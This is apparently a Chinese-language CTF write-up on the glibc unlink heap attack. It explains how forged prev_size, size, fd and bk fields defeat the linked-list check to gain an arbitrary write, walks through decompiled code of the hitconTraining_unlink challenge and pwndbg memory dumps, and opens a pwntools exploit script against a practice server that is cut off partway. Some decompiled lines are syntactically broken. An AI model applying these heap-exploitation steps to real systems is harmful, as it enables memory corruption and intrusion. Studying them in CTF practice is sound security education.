+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>
+
+<p>意思是在脱链之前，会检查加粗红线的链表是否指向要脱掉的链，可以防止双向链表的破坏，</p>
+<p>防止FD中的bk被修改或者BK的fd指针被修改</p>
+<p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767173151507-e3573d6b-4aec-4241-a77b-331449cee00f-333874.png" alt="1767173151507-e3573d6b-4aec-4241-a77b-331449cee00f.png"></p>
+<h4 id="unlink-getshell的过程与实现"><a href="#unlink-getshell的过程与实现" class="headerlink" title="unlink getshell的过程与实现"></a>unlink getshell的过程与实现</h4><ul>
+<li>glibc没办法判断这个位置是不是chunk，他是根据prev_size和size确定堆块的</li>
+</ul>
+<h5 id="tip）glibc如何识别chunk"><a href="#tip）glibc如何识别chunk" class="headerlink" title="tip）glibc如何识别chunk"></a><font style="color:#DF2A3F;">tip）glibc如何识别chunk</font></h5><p><font style="color:rgb(0, 0, 0);">从某个起始地址（比如当前 chunk 的末尾）读取</font><code><font style="color:rgb(0, 0, 0);">prev_size</font></code><font style="color:rgb(0, 0, 0);">和</font><code><font style="color:rgb(0, 0, 0);">size</font></code><font style="color:rgb(0, 0, 0);">的值；</font></p>
+<p><font style="color:rgb(0, 0, 0);">完全按照这两个值来计算 “下一个堆块的起始地址”“前一个堆块的起始地址”，并执行后续操作。</font></p>
+<h5 id="unlink欺骗glibc过程"><a href="#unlink欺骗glibc过程" class="headerlink" title="unlink欺骗glibc过程"></a>unlink欺骗glibc过程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位系统，初始堆内存布局（地址为示例，核心看偏移） </span></span><br><span class="line"><span class="comment"># 地址         字段名                数值      说明</span></span><br><span class="line"><span class="number">0x1000</span>:        chunk0_prev_size     <span class="number">0x0</span>        <span class="comment"># chunk0是堆起始块，前块大小为0</span></span><br><span class="line"><span class="number">0x1008</span>:        chunk0_size          <span class="number">0xa1</span>      <span class="comment"># 0xa0(总大小) + 0x1(P位=1，前块被使用)</span></span><br><span class="line"><span class="number">0x1010</span>-<span class="number">0x109F</span>: chunk0用户区         合法数据    <span class="comment"># 共0x90字节（0x1010到0x109F）</span></span><br><span class="line"><span class="number">0x10A0</span>:        chunk1_prev_size     <span class="number">0xa0</span>      <span class="comment"># 前块(chunk0)总大小是0xa0</span></span><br><span class="line"><span class="number">0x10A8</span>:        chunk1_size          <span class="number">0xa1</span>      <span class="comment"># 0xa0(总大小) + 0x1(P位=1)</span></span><br><span class="line"><span class="number">0x10B0</span>-:       chunk1用户区         合法数据    <span class="comment"># chunk1的实际使用区域</span></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">堆溢出篡改后的内存布局（代码块格式）</font></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 篡改后堆内存布局（你通过change(<span class="number">0</span>)写入payload的结果）</span><br><span class="line"># 地址          字段名                数值         说明（你的伪造目的）</span><br><span class="line"><span class="number">0x1000</span>:         chunk0_prev_size      <span class="number">0x0</span>         # 保持不变，不影响核心逻辑</span><br><span class="line"><span class="number">0x1008</span>:         chunk0_size           <span class="number">0x91</span>        # 伪造：<span class="number">0x90</span>(总大小) + <span class="number">0x1</span>(P位=<span class="number">1</span>)</span><br><span class="line"><span class="number">0x1010</span>:         fake_fd               <span class="number">0x6020A8</span>    # 伪造fd：ptr<span class="number">-0x18</span>（目标地址偏移）</span><br><span class="line"><span class="number">0x1018</span>:         fake_bk               <span class="number">0x6020B0</span>    # 伪造bk：ptr<span class="number">-0x10</span>（目标地址偏移）</span><br><span class="line"><span class="number">0x1020</span><span class="number">-0x108F</span>:  填充数据               b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>   # 占满chunk0用户区剩余<span class="number">0x70</span>字节</span><br><span class="line"><span class="number">0x1090</span>:         fake_chunk1_prev_size <span class="number">0x90</span>        # 伪造chunk1的prev_size，欺骗glibc计算</span><br><span class="line"><span class="number">0x1098</span>:         fake_chunk1_size      <span class="number">0xa0</span>        # 伪造chunk1的size，绕过glibc检查</span><br><span class="line"><span class="number">0x10A0</span>:         chunk1_prev_size      <span class="number">0xa0</span>        # 原始值未改，但glibc会被伪造值误导</span><br><span class="line"><span class="number">0x10A8</span>:         chunk1_size           <span class="number">0xa1</span>        # 原始值未改</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">当你调用</font><code><font style="color:rgba(0, 0, 0, 0.85) !important;">remove(1)</font></code><font style="color:rgb(0, 0, 0);">（即 glibc 执行</font><code><font style="color:rgba(0, 0, 0, 0.85) !important;">free(chunk1)</font></code><font style="color:rgb(0, 0, 0);">），glibc 会按固定逻辑检查前块是否可合并，步骤如下：</font></p>
+<ol>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">第一步：读取 chunk1 的 prev_size，找前块地址</font></strong><ul>
+<li><font style="color:rgb(0, 0, 0);">glibc 从 chunk1 起始地址</font><font style="color:#1DC0C9;"> 0x10A0</font><font style="color:rgb(0, 0, 0);"> 读取</font><font style="color:#74B602;"> prev_size</font><font style="color:rgb(0, 0, 0);">，原始值是 </font><font style="color:#1DC0C9;">0xa0</font><font style="color:rgb(0, 0, 0);">；</font></li>
+<li><font style="color:rgb(0, 0, 0);">计算前块地址</font><font style="color:#1DC0C9;">：0x10A0 - 0xa0 &#x3D; 0x1000</font><font style="color:rgb(0, 0, 0);">（这是 chunk0 的合法起始地址）；</font></li>
+<li><font style="color:rgb(0, 0, 0);">读取 </font><font style="color:rgb(0, 0, 0);">0x1008</font><font style="color:rgb(0, 0, 0);">（chunk0 的 size），值为你伪造的 </font><font style="color:rgb(0, 0, 0);">0x91</font><font style="color:rgb(0, 0, 0);">，检查 P 位 &#x3D; 1（表示前块被使用）</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">第二步：被伪造的 chunk1 prev_size 误导，重新计算</font></strong><ul>
+<li><font style="color:rgb(0, 0, 0);">glibc 会额外检查 “当前 chunk1 的</font><font style="color:#74B602;"> prev_size</font><font style="color:rgb(0, 0, 0);"> 是否与前块 size 匹配”；</font></li>
+<li><font style="color:rgb(0, 0, 0);">它读取你伪造的</font><font style="color:#1DC0C9;"> 0x1090 </font><font style="color:rgb(0, 0, 0);">位置的 </font><font style="color:#1DC0C9;">prev_size&#x3D;0x90</font><font style="color:rgb(0, 0, 0);">（本应是 chunk0 用户区的内存，却被当成 chunk1 的</font><font style="color:#74B602;"> prev_size</font><font style="color:rgb(0, 0, 0);">）；</font></li>
+<li><font style="color:rgb(0, 0, 0);">重新计算前块地址：</font><font style="color:#1DC0C9;">0x10A0 - 0x90 &#x3D; 0x1010</font><font style="color:rgb(0, 0, 0);">（ 这样就会把 chunk0 用户区的地址当成了 “前块起始地址”）。</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">第三步：把伪造地址当合法 chunk，执行 unlink</font></strong><ul>
+<li><font style="color:rgb(0, 0, 0);">glibc 认为</font><font style="color:#1DC0C9;"> 0x1010 </font><font style="color:rgb(0, 0, 0);">是一个合法的 free chu</font><font style="color:rgb(0, 0, 0);"></font><font style="color:rgb(0, 0, 0);">nk 起始地址；</font></li>
+<li><font style="color:rgb(0, 0, 0);">读取 </font><font style="color:#1DC0C9;">0x1010</font><font style="color:rgb(0, 0, 0);"> 的 fd（你伪造的</font><font style="color:#1DC0C9;"> 0x6020A8 </font><font style="color:rgb(0, 0, 0);">）和 </font><font style="color:#1DC0C9;">0x1018 </font><font style="color:rgb(0, 0, 0);">的 bk（你伪造的 </font><font style="color:#1DC0C9;">0x6020B0</font><font style="color:rgb(0, 0, 0);">）；</font></li>
+<li><font style="color:rgb(0, 0, 0);">执行 unlink 核心逻辑：</font><strong><font style="color:rgb(249, 250, 251);">c</font></strong><font style="color:rgba(255, 255, 255, 0.55);">运行</font></li>
+</ul>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BK-&gt;fd = FD → 0x6020B0 + 0x8 = 0x6020B8（目标地址）写入0x6020A8</span></span><br><span class="line">*(<span class="number">0x6020B0</span> + <span class="number">0x8</span>) = <span class="number">0x6020A8</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = BK → 0x6020A8 + 0x10 = 0x6020B8（目标地址）写入0x6020B0</span></span><br><span class="line">*(<span class="number">0x6020A8</span> + <span class="number">0x10</span>) = <span class="number">0x6020B0</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;此时&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;0x6020B8&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;（即你要篡改的&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ptr=0x6020C0+0x8&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;）被写入指定值，实现任意地址写。&lt;/font&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="核心本质总结"><a href="#核心本质总结" class="headerlink" title="核心本质总结"></a><font style="color:rgb(0, 0, 0);">核心本质总结</font></h5><ul>
+<li><font style="color:rgb(0, 0, 0);">glibc 全程没有验证 “0x1010是不是系统分配的合法 chunk 起始地址”，只看内存中prev_size&#x2F;size的数值；</font></li>
+<li><font style="color:rgb(0, 0, 0);">你通过堆溢出把 “用户区内存” 伪装成 prev_size&#x2F; size字段，glibc 就 “机械地” 按这些伪造值计算地址、执行操作；</font></li>
+<li><font style="color:rgb(0, 0, 0);">最终把本应操作堆块链表的写入，转移到了你指定的任意地址，这就是 unlink 攻击的核心。</font></li>
+</ul>
+<p><strong><font style="color:#DF2A3F;">unlink 攻击的巧妙之处：用真实堆块的头部触发逻辑，用假堆块的头部执行攻击，</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">两者的 </font></strong><code><strong><font style="color:#DF2A3F;">prev_size</font></strong></code><strong><font style="color:#DF2A3F;"> 写法不同，正是因为它们的作用对象完全不同。</font></strong></p>
+<h3 id="hitconTraining-unlink"><a href="#hitconTraining-unlink" class="headerlink" title="hitconTraining_unlink"></a>hitconTraining_unlink</h3><p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767188475648-3c47ce38-992a-46b7-a008-afca5ce6e122-413458.png" alt="1767188475648-3c47ce38-992a-46b7-a008-afca5ce6e122.png">main函数很清晰的标注整个链表能显示开辟了十个字节的堆空间，之后进行增删改查</p>
+<p>先通过运行程序把伪代码逆向一下看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (**v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = (<span class="type">void</span> (**)(<span class="type">void</span>))<span class="built_in">malloc</span>(<span class="number">0x10u</span>);</span><br><span class="line">  *v4 = (<span class="type">void</span> (*)(<span class="type">void</span>))hello_message;</span><br><span class="line">  v4[<span class="number">1</span>] = (<span class="type">void</span> (*)(<span class="type">void</span>))goodbye_message;</span><br><span class="line">  (*v4)();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4[<span class="number">1</span>]();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show_item</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; </span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( name )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>, i, name));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add_item</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">    size = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( !size )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !name )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;itemlist + <span class="number">4</span> * i) = size;</span><br><span class="line">        name = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">        *(_BYTE *)name + (<span class="type">int</span>)read(<span class="number">0</span>, name, size)) = <span class="number">0</span>;</span><br><span class="line">        ++num;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change_item</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> nbytes; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( name )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, nptr, <span class="number">8u</span>);</span><br><span class="line">      nbytes = atoi(nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>);</span><br><span class="line">      *(_BYTE *)name + (<span class="type">int</span>)read(<span class="number">0</span>, *(name, len)) = <span class="number">0</span>;<span class="comment">//堆溢出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><ul>
+<li>已知程序在开头申请了0x10个字节大小的堆块</li>
+<li>我们需要申请三个堆块，并且第1，2个堆块尽量在free后能够放入unsorted bin链表</li>
+<li>第三个堆块随便申请（防止free第二个堆块时，第二个堆块与第一个堆块合并之后再合并入top_chunk）</li>
+<li>用change函数修改堆块造成堆溢出</li>
+<li><font style="color:rgb(76, 73, 72);">gdb动态调试查看,先申请一个堆块，使用</font><code><font style="color:rgb(244, 116, 102);background-color:rgba(27, 31, 35, 0.05);">x/20gx 0x6020C0</font></code><font style="color:rgb(76, 73, 72);">查看这个结构体数组，发现该指针在</font><code><font style="color:rgb(244, 116, 102);background-color:rgba(27, 31, 35, 0.05);">0x6020c0+0x8</font></code><font style="color:rgb(76, 73, 72);">的这个位置</font><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767202086802-bcd78259-b27b-4bc9-8f23-791f08df5522-181856.png" alt="1767202086802-bcd78259-b27b-4bc9-8f23-791f08df5522.png"></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x6020C0</span></span><br><span class="line"><span class="number">0x6020c0</span> &lt;itemlist&gt;:    <span class="number">0x0000000000000032</span>      <span class="number">0x0000000000c19030</span></span><br><span class="line"><span class="number">0x6020d0</span> &lt;itemlist+<span class="number">16</span>&gt;: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020e0</span> &lt;itemlist+<span class="number">32</span>&gt;: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020f0</span> &lt;itemlist+<span class="number">48</span>&gt;: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602100</span> &lt;itemlist+<span class="number">64</span>&gt;: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602110</span> &lt;itemlist+<span class="number">80</span>&gt;: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602120</span> &lt;itemlist+<span class="number">96</span>&gt;: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602130</span> &lt;itemlist+<span class="number">112</span>&gt;:        <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602140</span> &lt;itemlist+<span class="number">128</span>&gt;:        <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602150</span> &lt;itemlist+<span class="number">144</span>&gt;:        <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgb(76, 73, 72);">所以就可以利用如下所示伪造堆块、堆溢出、unlink_attack直接任意地址写</font></li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767201576247-22e27a51-853a-4226-b32d-d1717e37480f-712920.png" alt="1767201576247-22e27a51-853a-4226-b32d-d1717e37480f.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29885</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lens,txt</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lens).encode(<span class="string">&#x27;utf-8&#x27;</span>))    	</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,lens,txt</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lens).encode(<span class="string">&#x27;utf-8&#x27;</span>))    </span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span 